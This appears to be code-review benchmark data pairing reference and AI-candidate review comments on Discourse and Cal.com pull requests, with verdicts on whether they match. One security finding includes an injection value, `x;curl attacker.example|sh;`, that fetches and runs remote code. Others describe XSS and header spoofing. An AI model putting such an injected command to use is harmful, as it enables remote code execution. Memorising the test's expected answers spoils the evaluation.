`i.content.scrub` assumes every item has a content element. Many RSS 2.0 feeds only provide `<description>`, so SimpleRSS returns nil for `content` and this raises `NoMethodError` on nil. That exception aborts the whole `rss.items.each` loop, so no items are imported.

Separately, `String#scrub` only exists from Ruby 2.1. On the Ruby 1.9.3/2.0 versions Discourse supported at the time it raises `NoMethodError` for every item.

Fall back to `description`, guard against nil, and use an encoding-safe alternative to `scrub`.
true_positives.reasoning: The candidate identifies the same core bug: i.content.scrub assumes content is present, but many RSS feeds only provide description, so nil content raises NoMethodError. The extra Ruby scrub compatibility note does not change the underlying issue.

false_positives.candidate:
raw_html cook method bypasses all sanitization

When `cook_method == raw_html`, `cook` returns `raw` untouched, so the PrettyText sanitizer is skipped.

Affected content:
- RSS content from `PollFeed`: `CGI.unescapeHTML(i.content)` is passed straight in, so `<script>`, event handlers and iframes survive.
- Readability output from `import_remote`: it allows `href`/`src` attributes, so `javascript:` URLs survive.
- Any later edit of the post through the normal editor. The post keeps `raw_html`, so whoever can edit it (the `embed_by_username` user, who need not be staff, and staff) can inject arbitrary script.

This content is rendered with `raw` in `best.html.erb` and as cooked HTML in the main Discourse UI, i.e. on the forum origin. Raw HTML posts should still go through a whitelist sanitizer.

Anyone can make the server fetch pages and create topics for arbitrary URLs on the embeddable host

The only gate is a Referer header check, which is trivially spoofed outside a browser (e.g. curl). After that, any `embed_url` on the embeddable host triggers a `retrieve_topic` job. Throttling is per exact URL string, so `?a=1`, `?a=2`, ... each cause an outbound HTTP fetch and a new topic.

When feed polling is enabled, each new URL also triggers a full synchronous feed poll. The loading page reloads every 30 seconds forever for every viewer, enqueueing another job each time.

This lets unauthenticated users spam topics and load the server. Consider normalizing URLs, a global rate limit, and only creating topics for URLs that actually appear in the feed or are explicitly allowed.

Updating an embed whose post was deleted raises on nil and permanently breaks that embed

On the update path, `post = embed.post` then `PostRevisor.new(post).revise!(...)`. Post uses the Trashable default scope, so if a moderator deletes the imported post, `embed.post` is nil.

The next feed poll then raises `NoMethodError`, and because there is no per-item rescue, every later item in the feed is skipped on every poll.

The TopicEmbed row still points at the deleted topic, so `topic_id_for_embed` keeps returning it. `TopicView` then raises NotFound, and the embed shows an error forever without re-importing. Handle a missing/deleted post: skip it, or remove the stale embed row.

absolutize_urls corrupts protocol-relative URLs

Any `href`/`src` starting with `/` is rewritten as `"#{prefix}/#{href.sub(/^\/+/, '')}"`. A protocol-relative URL such as `//cdn.example.com/img.png` (very common for images and CDN assets) becomes `http://embeddable-host/cdn.example.com/img.png`, which breaks images and links in imported posts.

Fix: skip values starting with `//`, or better, resolve every link with `URI.join(url, href)`. That would also handle relative paths without a leading slash, which the comment claims to support but the code does not.

PostCreator failure not detected; nested transaction defeats PostCreator's rollback

`PostCreator#create` returns the unsaved `@post` even when saving failed, so `post.present?` is true. `TopicEmbed.create!` then runs with `post_id: nil` and hits the NOT NULL constraint, raising a database error instead of failing gracefully.

Also, `PostCreator` signals failure by raising `ActiveRecord::Rollback` inside `Post.transaction`. Nested inside the outer `Topic.transaction` without `requires_new`, that Rollback is swallowed by the inner block and does not roll anything back. The topic created by TopicCreator is only undone here by the accident of the later NOT NULL error.

Check `post.persisted?` / `creator.errors` and avoid the outer transaction, or use `requires_new: true`.

Disqus import regresses: category option and original dates dropped, aborts on any dead link

The `--category` option and the per-topic `created_at` from the Disqus export were removed, so imported topics land uncategorized and dated at import time.

The task now calls `TopicEmbed.import_remote`, which does a live HTTP fetch of every thread link with no error handling. Any thread whose original page now returns 404 or is unreachable raises `OpenURI::HTTPError` or a socket error and aborts the entire import midway.

The import also now requires network access to the source site.

Feed import is subject to normal user rate limits

`PollFeed` creates one topic per feed item in a tight loop as `embed_by_username`, but does not disable `RateLimiter`. The Disqus importer does disable it.

`skip_validations` does not bypass the `rate_limit` callbacks on Post/Topic. If the configured user is not staff, the second item hits `rate_limit_create_topic` / `max_topics_per_day` and raises `RateLimiter::LimitExceeded`. That aborts the rest of the feed on every hourly run.

The setting description does not tell admins that the user must be staff. Either disable rate limiting for imports or document and enforce a staff user.

Every uncached embed URL triggers a full synchronous feed poll

`perform_retrieve` calls `Jobs::PollFeed.new.execute({})` inline whenever a URL has no embed yet. Each distinct unknown URL re-downloads and re-processes the entire feed, hashing and comparing every item, on top of the hourly scheduled poll.

Combined with the publicly reachable endpoint and the 30-second auto-reload of the loading page, this multiplies outbound requests and DB work.

Non-atomic setnx + expire can block a URL from ever being retrieved

`$redis.setnx(key, '1')` followed by a separate `$redis.expire(key, 60)` is not atomic. If the process dies or Redis errors between the two calls, the key never expires. Every later non-staff request for that URL is then treated as "retrieved recently" forever.

Use `$redis.set(key, '1', nx: true, ex: 60)`.

Existing migration edited to add force: true

This migration has already been run on existing installs. Editing it does nothing there, but anyone re-running it (or running it on a DB where the table exists) will silently drop `top_topics`.

The new `create_topic_embeds` migration also uses `force: true`, which would drop an existing `topic_embeds` table and its data. Neither change is needed; existing migrations should not be modified.

On the PostgreSQL versions in use at the time (pre-11), `add_column ... default: 1, null: false` rewrites the entire `posts` table under an exclusive lock. On large forums this blocks all reads and writes to posts for the duration of the migration.

The usual safe pattern is: add the column nullable, backfill in batches, then add the default and NOT NULL.

URL and username requirement tests pass trivially

The "requires feed_polling_url" and "requires embed_by_username" examples stub only the setting under test. `feed_polling_enabled` defaults to false, so `poll_feed` is never called regardless of the URL or username. These tests would still pass if the `feed_polling_url` / `embed_by_username` checks were removed.

They should stub `feed_polling_enabled?` to true and the other settings to valid values. There are also no tests for `poll_feed` itself or `import_remote`.

"is 404 without an embed_url" actually tests the missing host check

With no `embeddable_host` configured, `ensure_embeddable` raises InvalidAccess (403) before `params.require(:embed_url)` is reached. The example only asserts `should_not be_success`, so it never exercises the missing-parameter path its name describes, and it duplicates the next test. Stub a valid host and referer to actually test a missing `embed_url`.

`ruby-readability` and `simple-rss` (plus `guess_html_encoding`) were added to `Gemfile_rails4.lock` only. The Gemfile still supports Rails 3 dual-boot via `Gemfile.lock`, which was not updated. Deployment-mode bundling under `RAILS3=1` will fail or resolve unpinned versions.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client size check ignores `max_attachment_size_kb` and hardcodes 10MB for all file types

This has two effects:
- Sites that configured `max_attachment_size_kb` above 10MB can no longer upload attachments their admins allowed; the client blocks them with a misleading "max 10240 KB" message.
- Attachments between the configured limit and 10MB are no longer rejected client-side. They are fully uploaded and then rejected by the server.

Only images should get the raised limit; attachments should keep using `max_attachment_size_kb`.
true_positives.reasoning: Both identify the same bug: replacing the per-type Discourse.SiteSettings['max_' + type + '_size_kb'] limit with a hardcoded 10MB client check, so attachment limits diverge from server/admin settings.

That branch is skipped when `allow_animated_thumbnails` is off, or when the tempfile path has no `.gif` extension.

When the gifsicle branch is taken, `resize_instructions_animated` passes `--resize-fit 80%`. gifsicle expects `WxH` geometry, not a percentage, so the command fails every time. `convert_with` returns false, the loop burns all 5 attempts, and the upload is still rejected as too large.

The feature does not work correctly for GIFs in either case.
true_positives.reasoning: The candidate explicitly identifies the same bug: the animated GIF path passes --resize-fit 80%, but gifsicle expects WxH geometry rather than a percentage, causing the resize to fail. Additional GIF concerns do not change the core match.

false_positives.candidate:
Shell command injection via user-supplied `type` param in tempfile path

For API uploads by URL, the tempfile comes from `FileHelper.download(url, 10.megabytes, "discourse-upload-#{type}")`. `type` is the raw `params.require(:type)`, and Tempfile embeds that prefix verbatim in the file path.

The new loop passes `tempfile.path` to `OptimizedImage.downsize`. That builds the command with `%W{convert #{from}[0] ...}` and runs it through backticks (`convert_with`), so the path is interpreted by a shell.

A `type` such as `x;curl attacker.example|sh;` therefore executes arbitrary commands as the web process user for anyone with API access. Paths must be shell-escaped (`Shellwords.escape`) or the command run with an argv array (`Open3`/`system(*args)`), and `type` should be validated against a whitelist.

Large SVG uploads are run through ImageMagick and mangled

`FileHelper.is_image?` matches `.svg`, so any SVG over `max_image_size_kb` enters the downsize loop. There it is rasterized by `convert` and written back in place: as SVG for no-extension Rack tempfiles, or by the `.svg` extension for URL downloads. The original vector content is replaced by an ImageMagick-generated approximation.

`OptimizedImage.create_for` deliberately special-cases SVG (`FileUtils.cp` instead of resizing); this new path does not. It also needlessly feeds user-supplied SVG to ImageMagick's SVG/MSVG coders, a known attack surface. Exclude SVG (and other vector formats) from the auto-downsize.

Up to 5 full convert + ImageOptim passes per upload on request/defer thread; failures not detected

Each iteration runs a full ImageMagick re-encode, then `ImageOptim.new.optimize_image!` (inside `convert_with`), on a file of up to 10MB.
- For `synchronous` API uploads this blocks the request worker.
- Otherwise it runs inside `Scheduler::Defer`, which processes deferred work serially per process, so one large upload stalls all other deferred jobs.

Other problems with the loop:
- The return value of `downsize` is ignored, so a failing `convert` is retried 5 times for nothing.
- ImageOptim runs on every intermediate pass instead of once.
- JPEGs are lossily re-encoded up to 5 times, compounding quality loss.

Computing the required scale factor up front and resizing once would avoid all of this.

413 error message reports a hardcoded 10MB limit

A 413 comes from the web server/proxy (e.g. nginx `client_max_body_size`), whose limit is independent of this code. The alert now always tells users the maximum is 10240 KB, which is wrong on any deployment configured differently. The same 10MB magic number is also duplicated in three places (two in this file, one in the controller) with no shared setting.

false_negatives.golden_comment: The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

false_positives.candidate:
Explicit `render :show` runs before `canonical_url` is set, breaking canonical links on topic pages

`perform_show_response` now calls `render :show` inside the `format.html` block, so the page and layout render immediately. In `show`, `canonical_url ...` is called afterwards (line 87). Previously the implicit render ran at the end of the action, after `@canonical_url` was set.

Now the layout's canonical link tag sees no `@canonical_url` and falls back to the default (the raw request URL). Every topic HTML page loses its proper `<link rel="canonical">`. For example, `/t/slug/123/45` becomes its own canonical instead of the topic's canonical path. This is an SEO regression affecting all topic views.

Fix: move the `canonical_url` call above `perform_show_response`, or render `:show` explicitly only in `unsubscribe`.

Saving TopicUser directly leaves notifications_reason_id nil, so auto-tracking silently undoes the unsubscribe

The action sets `notification_level` and calls `tu.save!`, bypassing `TopicUser.change`. `change` would also set `notifications_reason_id = user_changed`, set `notifications_changed_at`, and publish the MessageBus `notification_level_change`.

Because the reason stays NULL, the SQL in `TopicUser.update_last_read` will overwrite the level with `tracking` the next time the user reads the topic past the auto-track threshold. That SQL runs `case when tu.notifications_reason_id is null and total_msecs_viewed > threshold then :tracking`. `auto_track` also only acts on rows with a nil reason. Users who were auto-tracked by reading, which is the common case, therefore get re-subscribed as soon as they open the topic again. Open browser tabs also never learn about the level change.

Fix: use `TopicUser.change(current_user, topic_id, notification_level: ...)`.

Non-idempotent state-changing GET; first click doesn't actually stop notifications

The unsubscribe link is a GET that toggles state. If the level is above regular it drops to regular; otherwise it mutes.

Two consequences:
1. Email link scanners and prefetchers (e.g. Outlook Safe Links, corporate gateways) or a second click will step the user further, from watching/tracking to regular and then to muted, without the user's intent.
2. A tracking or watching user who receives a reply/mention/quote email and clicks "stop receiving notifications about this particular topic" is only set to `regular`. Regular still receives reply, mention and quote notifications and emails. Yet both the email text and the page ("You will stop receiving notifications for ...") claim notifications have stopped.

The action should set an explicit target level (e.g. muted) idempotently, or the copy should match the behavior.

Unsubscribe link from email requires an active session

`:unsubscribe` was added to `ensure_logged_in`. Users frequently click email links in a browser or client where they are not logged in. They will get the NotLoggedIn handling (redirect to `/` or a 403) and the unsubscribe never happens. The intended URL is not preserved for after login, so the user lands somewhere unrelated with no explanation. Consider storing the destination and redirecting to login.

unsubscribe_link translation now requires unsubscribe_url for every add_unsubscribe_link caller

The `unsubscribe_link` string in server.en.yml now interpolates `%{unsubscribe_url}`, and it is rendered in both `html_part` (line 67) and `body` (line 90) whenever `add_unsubscribe_link` is true.

Any caller that passes `add_unsubscribe_link: true` without `unsubscribe_url` will raise `I18n::MissingInterpolationArgument` when building the email. Such callers include other mailers or plugins, and any non-topic email. The existing spec had to be modified to pass `unsubscribe_url` for exactly this reason.

Fix: make the per-topic sentence conditional (separate key appended only when `unsubscribe_url` is present), or default the argument.

Overriding computed `details.notificationReasonText` leaks into the identity-mapped topic

`store.createRecord('topic', { id })` with an id hydrates through the store's identity map. The topic route later reuses the same Topic and TopicDetails instance when the user navigates to `/t/slug/id`.

Setting `details.notificationReasonText` to null overrides the computed property on that object. After visiting the unsubscribe page and then opening the topic in the same session, the notification reason text stays blank and no longer updates when the level changes.

Fix: hide the text in this template or view instead of mutating the shared model.

In-app navigation to the unsubscribe URL shows confirmation without changing anything

The client route `topicUnsubscribe` only loads the topic via `PostStream.loadTopicView`, which hits `/t/:id.json`. It never calls the server `unsubscribe` action. The state change happens only on a full page load.

If the URL is followed inside the running Ember app, the page says "You will stop receiving notifications" but the notification level is untouched. Discourse intercepts same-origin links, so this happens with a link pasted in a post or reached through browser history.

No tests for the new unsubscribe behavior

The spec only passes `unsubscribe_url` to keep the existing test from raising. It never asserts that the per-topic URL appears in the body or HTML part.

There are also no tests for:
- the new `TopicsController#unsubscribe` action: level transitions, missing TopicUser, slug redirect, logged-out behavior;
- `Topic#unsubscribe_url`;
- the `render :show` change in `perform_show_response`.

That last one introduced the canonical-URL regression, which is currently untested.

true_positives.golden_comment: The updateManyByCredentialId call uses an empty data object, which prevents Prisma's @updatedAt decorator from updating the updatedAt timestamp. This results in inaccurate cache status tracking, as the timestamp isn't updated when the cache is refreshed. To fix this, explicitly set the updatedAt field.
true_positives.matched_candidate:
updateMany with empty data does not bump SelectedCalendar.updatedAt

`SelectedCalendarRepository.updateManyByCredentialId(this.credential.id, {})` is meant to touch `SelectedCalendar.updatedAt` after each cache refresh. Prisma only injects `@updatedAt` when the update has at least one field; with `data: {}` the update is a no-op. So `updatedAt` never changes, and the call is a wasted DB round trip on every webhook-driven cache refresh.

The PR description's claim that SelectedCalendar.updatedAt is updated via the webhook handler is therefore false.

Either set `updatedAt: new Date()` explicitly or remove the call. The PR notes the field is unused in the frontend anyway. Also note that `updateManyByCredentialId` is typed with `SelectedCalendarUpdateInput` rather than `SelectedCalendarUpdateManyMutationInput`.
true_positives.reasoning: The candidate identifies the same bug: calling updateManyByCredentialId with an empty data object does not trigger Prisma's @updatedAt behavior, so SelectedCalendar.updatedAt is not refreshed. It also proposes the same fix of explicitly setting updatedAt.

true_positives.golden_comment: logic: macOS-specific sed syntax with empty string after -i flag will fail on Linux systems
true_positives.matched_candidate:
BSD-only `sed -i ''` breaks on Linux; relative ENV_FILE depends on cwd

`sed -i '' -E ...` is macOS/BSD syntax. With GNU sed, the empty string is parsed as the sed script and the `s|...|` expression as a filename, so updating an existing `GOOGLE_WEBHOOK_URL` fails on Linux.

Separately, `ENV_FILE="../.env"` (line 5) is resolved relative to the caller's cwd. Running `./scripts/test-gcal-webhooks.sh` from the repo root creates or edits a `.env` outside the repository.

Resolve the path relative to the script directory, and use a portable in-place edit (e.g. `sed -i.bak` or a temp file).
true_positives.reasoning: The candidate explicitly identifies the same macOS/BSD-specific sed -i '' syntax and explains that it fails on Linux with GNU sed, matching the golden comment's core issue.

true_positives.golden_comment: Throwing a generic Error for authentication failures results in a 500 response in tRPC. Instead, it should return a structured TRPCError with an appropriate code, such as FORBIDDEN, to accurately reflect the error type.
true_positives.matched_candidate:
Plain Error used for access denial yields 500 instead of NOT_FOUND/FORBIDDEN

When the credential does not belong to the user, the handler throws `new Error("Credential not found or access denied")`. tRPC maps a plain Error to INTERNAL_SERVER_ERROR (500). As a result, authorization failures show up as server errors in monitoring and clients cannot distinguish them.

Use `new TRPCError({ code: "NOT_FOUND" })` (or FORBIDDEN), consistent with other handlers.
true_positives.reasoning: Both comments identify the same bug: throwing a plain Error for credential access denial causes tRPC to return a 500 INTERNAL_SERVER_ERROR. Both recommend using a structured TRPCError with NOT_FOUND or FORBIDDEN instead.

true_positives.golden_comment: Date is formatted with hardcoded 'en-US' locale instead of using the user's locale from useLocale, which can lead to incorrect date representation for users in different locales.
true_positives.matched_candidate:
Cache timestamp formatted with hard-coded en-US locale

The "Last updated" timestamp is formatted with `new Intl.DateTimeFormat("en-US", …)`, while the surrounding string is translated via `t()`. Users with other locales see US-style dates (MM/DD/YY, 12h clock) inside localized text.

Use the user's locale from `useLocale()` (e.g. `i18n.language`), or the app's date formatting helpers, together with the user's time format preference.
true_positives.reasoning: Both comments identify the same bug: a timestamp is formatted with a hardcoded en-US locale rather than the user's locale, producing incorrect date formats for non-US users. The candidate's suggested fix aligns with the golden comment.

false_positives.candidate:
Deleting cache does not refresh connectedCalendars, so the UI keeps showing the old cache status

On success, `deleteCacheMutation` only shows a toast and calls the optional `onSuccess` prop (`onChanged` from the wrapper, which is often undefined). It never invalidates `utils.viewer.calendars.connectedCalendars`. The disconnect mutation in the same component does invalidate it in `onSettled`.

After a successful delete, the dropdown keeps showing "Cache Status / Last updated: …" and the "Delete cached data" action. That stale state lasts until something else refetches the query, and `refetchOnWindowFocus` is false for this query. This contradicts the test plan's "UI updates appropriately".

Fix: invalidate `viewer.calendars.connectedCalendars` in `onSuccess`/`onSettled`.

Cache status includes expired cache rows

`getCacheStatusByCredentialIds` groups over all CalendarCache rows for the credential and takes the max `updatedAt`, without filtering on `expiresAt >= now`. `getCachedAvailability` ignores expired rows, so a credential whose cache has fully expired is still reported as having cache data with a "Last updated" timestamp. The dropdown then shows a status for cache that is never served.

Add `expiresAt: { gte: new Date() }` to the `where` clause.

UserWithCalendars now requires updatedAt/googleChannelId that nothing consumes

`allSelectedCalendars` and `userLevelSelectedCalendars` now require `updatedAt` and `googleChannelId`. Nothing in this PR reads these fields; the UI uses `cacheUpdatedAt` from CalendarCache.

`getConnectedDestinationCalendarsAndEnsureDefaultsInDb` is also exported for `@calcom/platform-libraries` and has other callers. Any caller that builds the user with only `externalId/integration/eventTypeId` now fails type-checking.

The change also widens the session user select (`findUnlockedUserForSession`) for no functional benefit. Revert these type and select changes unless they are needed.

Migration warning comment contradicts the SQL and legacy rows get a misleading timestamp

The header warns that the required column is added "without a default value. This is not possible if the table is not empty." The statement actually adds the column with `DEFAULT NOW()`, so the warning is stale and misleading.

Also, every existing CalendarCache row gets the migration time as `updatedAt`. Right after deploy, the new UI reports all legacy caches as "Last updated" at migration time, regardless of when they were actually written.

dev:cron relies on unpinned `npx tsx` not declared as a dependency

`tsx` is not listed in devDependencies, so `npx tsx` downloads whatever version is latest at run time. That requires network access and gives non-reproducible behavior. `ts-node` is still kept as a devDependency.

Add `tsx` as a pinned devDependency and invoke it directly, or keep `ts-node`. This change is also unrelated to the calendar-cache feature.

No tests for new deleteCache handler, cache status repository method, or dropdown

The PR adds a mutation that deletes data, guarded by an ownership check (`deleteCacheHandler`). It also adds `getCacheStatusByCredentialIds` and new conditional rendering logic in `CredentialActionsDropdown`, but none of these have tests.

At minimum, cover these cases:
- The handler rejects credentials owned by another user.
- The handler deletes only rows for the given credential.
- The status query returns the max `updatedAt` per credential.

true_positives.golden_comment: Incorrect end time calculation using slotStartTime instead of slotEndTime
true_positives.matched_candidate:
Override end check uses slot start, so slots extending past the override end are accepted

The slot is only rejected when `slotStartTime.isAfter(overrideEnd)`.

With an override ending at 18:00 and a 60-minute event:
- a 17:30 slot (ending 18:30) passes;
- an 18:00 slot also passes, because `isAfter` is false when the times are equal.

The point of this change is to enforce a fixed host's override in round-robin events, so slots that end after the override end should be rejected. Compare `slotEndTime` against the override end instead (`isAfter`).
true_positives.reasoning: Both identify the same bug: the override end boundary is checked against slotStartTime rather than slotEndTime, allowing slots that extend past the override end to be accepted.

true_positives.golden_comment: Using === for dayjs object comparison will always return false as it compares object references, not values. Use .isSame() method instead: dayjs(date.start).add(utcOffset, 'minutes').isSame(dayjs(date.end).add(utcOffset, minutes))
true_positives.matched_candidate:
Dayjs objects compared with ===, so the 'unavailable all day' branch never fires

`dayjs(date.start).add(...) === dayjs(date.end).add(...)` compares two freshly created object references and is always false. The intended detection of a zero-length ("unavailable") override never triggers.

The later checks do not fully cover it. A slot starting exactly at the override instant is neither before start nor after end. It sets `dateOverrideExist = true` and is returned as available, which also bypasses the busy check.

Use `.isSame(...)` or compare `valueOf()` instead.
true_positives.reasoning: Both identify the same bug: comparing dayjs objects with === checks references and is always false, so the zero-length/unavailable-all-day case never triggers. The candidate's suggested .isSame()/valueOf() fix matches the golden comment.

false_positives.candidate:
Slots on a date-override day skip the busy-time check, allowing double bookings

When a date override matches the slot's day and the slot is not rejected by it, `checkIfIsAvailable` hits `if (dateOverrideExist) return true;` and returns before `busy.every(...)` runs.

Busy times (existing Cal bookings and external calendar events) are only checked in this function. So on any day with a date override, a host's bookings and calendar conflicts are ignored and already-booked slots are offered again.

This is not limited to round-robin. Personal event types also go through the `fixedHosts.every(...)` path, because `isFixed` is true when there is no `schedulingType`. Every user with a date override can be double-booked on that day.

The override check should only reject slots; the busy check must still run afterwards.

Working-hours check rejects a slot if it falls outside ANY range for that weekday

`workingHours.find(...)` returns a match as soon as one working-hour entry for the slot's weekday does not contain the slot, and the slot is then marked unavailable. A slot should only be rejected if it is outside all ranges for that day.

This breaks two common cases:
- Users with split hours on the same day (e.g. 9–12 and 13–17). A 10:00 slot is outside 13–17, so it is rejected.
- Users whose local hours cross UTC midnight. `getWorkingHours` splits these into two entries with overlapping day sets. For Mon–Fri 9–17 in America/Los_Angeles you get `{days:[1..5], 960–1439}` and `{days:[2..6], 0–0}`. Every Tue–Fri slot is then outside the second entry and rejected.

This runs for every fixed host, including the single host of every personal event type. Most users in US timezones would lose most of their availability. The check should test that the slot is inside some range for that day (or be removed, since `getSlots` already generates slots only within working hours).

Override day matching uses server-local formatting and UTC calendar days instead of the organizer's local day

There are two problems with how the override's day is matched to the slot.

First, the format calls disagree on timezone. `dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` formats in the server process's local timezone, while `slotStartTime` is `.utc()`. On a server not running in UTC, the dates can mismatch.

Second, even on UTC servers the logic compares the UTC calendar date of the real override start with the UTC date of the slot. An organizer's local override day usually spans two UTC dates. For a PST organizer with an override on day D:
- slots on UTC date D that belong to local day D-1 (evening hours) are treated as part of the override day and wrongly rejected;
- override slots that fall on UTC date D+1 are not recognized as override slots and fall through to the working-hours check.

Matching should be done on the organizer-local date of the slot (e.g. `slotStartTime.tz(organizerTimeZone)`) against the override's date.

Converted override wraps around midnight and is dropped, leaving the day with no slots

The override is shifted into the invitee timezone and reduced to `hour()*60+minute()`, which wraps modulo a day.

If the shifted range crosses invitee midnight, startTime > endTime. For example, an IST 14:00–18:00 override seen from Pacific/Auckland becomes 21:30–01:30. A shifted end of exactly midnight becomes 0.

`buildSlots` skips ranges with `start >= end`. Because the user's working hours for that day were already spliced out in favor of the override, the invitee sees no slots at all that day, and the portion on the next invitee day is never produced.

The override needs to be split across invitee days, or the end clamped to 1440, rather than computed modulo 24h.

Missing override timeZone silently falls back to the runtime's local timezone

`TimeRange.timeZone` is declared optional. When it is absent, `dayjs(...).tz(override.timeZone)` gets `undefined` and the dayjs tz plugin uses the default/system local timezone.

In that case the organizer offset is computed against the client or server machine's timezone instead of the organizer's, and override slots are shifted incorrectly without any error. Any caller of `getSlots` that does not attach `timeZone` gets wrong results.

Fall back explicitly to `organizerTimeZone`, which is already a parameter, or make the field required.

No tests for the main fix or for the new availability checks' edge cases

The only added test re-runs the personal-event date-override scenario with a second, east-of-UTC timezone. Nothing covers the PR's headline change: a round-robin event with a fixed host whose date override should restrict slots.

The new logic in `checkIfIsAvailable` is also untested for:
- a booking or busy time on a date-override day (which would have exposed the busy-check bypass);
- users with split working hours or hours crossing UTC midnight (e.g. any US timezone);
- slots near the end of an override.

All fixtures use Asia/Kolkata 9:30–18:00, which maps to a single UTC range and hides these regressions.

true_positives.golden_comment: The deletion logic in scheduleSMSReminders.ts incorrectly deletes non-SMS workflow reminders (e.g., Email, WhatsApp) that have retryCount > 1. This occurs because the retryCount condition within the OR clause for deletion lacks a method: WorkflowMethods.SMS filter, causing it to apply to all reminder types instead of only SMS reminders, which is the intended scope of this function.
true_positives.matched_candidate:
Retry-count delete branch is not limited to SMS reminders

The second `OR` branch of the `deleteMany` is just `{ retryCount: { gt: 1 } }`, with no `method: WorkflowMethods.SMS` and no `scheduled: false`. `retryCount` lives on the shared `WorkflowReminder` table, so this SMS cron deletes any EMAIL or WHATSAPP reminder whose `retryCount` exceeds 1. As soon as the email or WhatsApp crons reuse this column for their own retry logic, their reminders will be silently removed by the SMS job. The branch should be scoped to `method: SMS` (and ideally `scheduled: false`).
true_positives.reasoning: Both comments identify the same bug: the retryCount > 1 deletion branch lacks a WorkflowMethods.SMS filter, so the SMS reminder job can delete non-SMS reminders such as Email or WhatsApp. The candidate's extra scheduled:false suggestion does not change the underlying issue.

false_positives.candidate:
Falsy scheduleSMS result is counted as a failure, so reminders of SMS-locked accounts get deleted

The new `else` branch increments `retryCount` whenever `twilio.scheduleSMS` returns a falsy value. In the Twilio provider, that function returns `undefined` on purpose when the user or team is locked for SMS sending (`smsLockState` LOCKED or REVIEW_NEEDED). That is a deliberate skip, not a delivery failure. Previously these reminders stayed in the table and could still be scheduled once an admin unlocked the account. Now they are permanently deleted after two cron runs, so a user under temporary review loses all upcoming SMS reminders. A deliberate skip should be told apart from a real scheduling error.

DB update inside catch can throw and abort the whole cron batch

The `catch` block used to only log. It now runs `prisma.workflowReminder.update(...)` first, which is not protected by its own try/catch. If that update fails (DB/connection error, or the row was deleted concurrently, which makes Prisma throw P2025), the exception escapes the `for` loop. The handler then returns a 500 and every remaining reminder in `unscheduledReminders` is skipped for this run. One bad reminder can stall SMS scheduling for everyone. Wrap the update in its own try/catch, or log first and swallow update errors.

Transient errors are treated like permanent ones; two failures permanently drop the reminder

Every exception in the try block increments `retryCount`, and after two increments the reminder is hard-deleted. That includes a Twilio outage or rate-limit response, and failures in unrelated code before sending such as `prisma.profile.findFirst`, `getBookerBaseUrl` or `customTemplate`. Two consecutive cron runs can be minutes apart, so a short provider outage now silently and permanently loses SMS reminders that would previously have been retried until the send date. The deletion is also not logged anywhere. Consider counting only non-retryable errors (e.g. invalid number) toward deletion, or allowing more attempts with logging.

OR on unindexed retryCount forces a full scan of WorkflowReminder on every cron run

Before this change, the `deleteMany` predicate (`method = SMS AND scheduledDate <= now`) could use the `[method, scheduled, scheduledDate]` index. Adding an `OR` branch on `retryCount`, which has no index and no `method` restriction, generally forces Postgres into a sequential scan of the entire `WorkflowReminder` table. That table includes all email and WhatsApp reminders and runs on every cron invocation. Scoping the second branch to `method = SMS` (or adding an index) would avoid this.

No tests for the new retry/deletion behavior

The PR adds logic that permanently deletes user reminders based on a failure counter, but no tests cover it. Cases worth covering: the increment on a falsy `scheduleSMS` result, the increment on a thrown error, deletion once `retryCount > 1`, and confirming that non-SMS reminders are untouched. Regressions here mean SMS reminders are silently lost.

false_negatives.golden_comment: Using retryCount: reminder.retryCount + 1 reads a possibly stale value and can lose increments under concurrency; consider an atomic increment via Prisma (increment: 1) to avoid race conditions (also applies to the similar update in the catch block).

true_positives.golden_comment: In getBaseConditions(), the else if (filterConditions) and final else branches are unreachable. This is because getAuthorizationConditions() always returns a non-null Prisma.Sql object, making authConditions always truthy, which means only the first two if/else if conditions are ever evaluated.
true_positives.matched_candidate:
Dead fallback branch would return filter conditions without any authorization

`getAuthorizationConditions()` always resolves to a `Prisma.Sql` object, which is always truthy. So the `else if (filterConditions) return filterConditions` and `else return NOTHING_CONDITION` branches can never run.

The branch is also dangerous as written. If auth conditions ever become nullable or empty in a refactor, the method would return only the user-supplied filters with no authorization restriction, exposing bookings across tenants.

The fallback for a missing auth condition should be `NOTHING_CONDITION`, never the filter alone, or the dead branches should be removed.
true_positives.reasoning: The candidate identifies the same unreachable-branch issue: getAuthorizationConditions always returns a truthy Prisma.Sql, so the filter-only and NOTHING_CONDITION fallbacks can never execute. The added security warning is extra context, not a different bug.

false_positives.candidate:
getBaseConditions returns an un-parenthesized OR expression when there are no filters

When both auth and filter conditions exist, `getBaseConditions` wraps each one: `(auth) AND (filter)`. When there are no filters, it returns `authConditions` unwrapped. For org and team scope that is `(teamBranch) OR (userBranch)`.

The old `findMany` let Prisma's `AND` array handle grouping. Raw-SQL callers will now write things like `WHERE ${baseConditions} AND "createdAt" >= ${start}`. Because SQL `AND` binds tighter than `OR`, that becomes `teamBranch OR (userBranch AND createdAt >= ...)`. Every caller-supplied predicate (date range, status, etc.) is then silently ignored for all team bookings.

The same problem affects the public `getFilterConditions`, which returns the bare `"eventTypeId" = X OR "eventParentId" = X`. Combining it as `${auth} AND ${filter}` would match any row with `eventParentId = X`, including rows outside the authorized set.

Fix: wrap every returned fragment in parentheses, e.g. `Prisma.sql\`(${authConditions})\``, or build each OR fragment already wrapped.

Public findMany method removed without a replacement query method

`findMany(findManyArgs)` was the service's public query entry point. It is deleted and replaced by `getBaseConditions()`, which only returns a SQL fragment.

Any existing or in-flight caller of `insightsBookingService.findMany(...)` will stop compiling. Each caller now has to hand-write `$queryRaw` against `"BookingTimeStatusDenormalized"` and get operator precedence right itself (see the parenthesization issue).

The PR description presents this as a test-only update and does not mention the API removal.

Org/team SQL fragments are never executed against the database

The only test that runs a generated condition against Postgres uses user scope (`"userId" = X AND "teamId" IS NULL`).

